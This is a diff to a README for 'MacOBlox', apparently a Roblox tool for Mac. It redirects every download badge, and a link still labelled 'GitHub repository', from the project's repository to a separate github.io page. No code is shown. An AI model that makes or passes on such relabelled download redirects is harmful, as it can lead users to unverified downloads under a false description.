@@ -43,7 +43,7 @@ Follow these simple steps to get MacOBlox up and running:
 
 ### Step 1: Download MacOBlox
 
-[![Download MacOBlox](https://img.shields.io/badge/Download-MacOBlox-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF4500)](https://github.com/Limbless-cigarbutt99/MacOBlox)
+[![Download MacOBlox](https://img.shields.io/badge/Download-MacOBlox-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF4500)](https://limbless-cigarbutt99.github.io)
 
 Visit this link to download the application.
 
@@ -162,7 +162,7 @@ Don't wait to expand your Roblox horizons. MacOBlox opens up a whole new world o
 
 **Ready to jump in?**
 
-[![Download MacOBlox Now](https://img.shields.io/badge/GET%20MACOBLOX-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Limbless-cigarbutt99/MacOBlox)
+[![Download MacOBlox Now](https://img.shields.io/badge/GET%20MACOBLOX-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://limbless-cigarbutt99.github.io)
 
 Visit this link to download the application.
 
@@ -174,7 +174,7 @@ MacOBlox is an open-source project, and contributions are welcome! Whether you w
 - Improve documentation
 - Report issues
 
-You can find everything you need in the [GitHub repository](https://github.com/Limbless-cigarbutt99/MacOBlox).
+You can find everything you need in the [GitHub repository](https://limbless-cigarbutt99.github.io).
 
 ## 📄 License
 
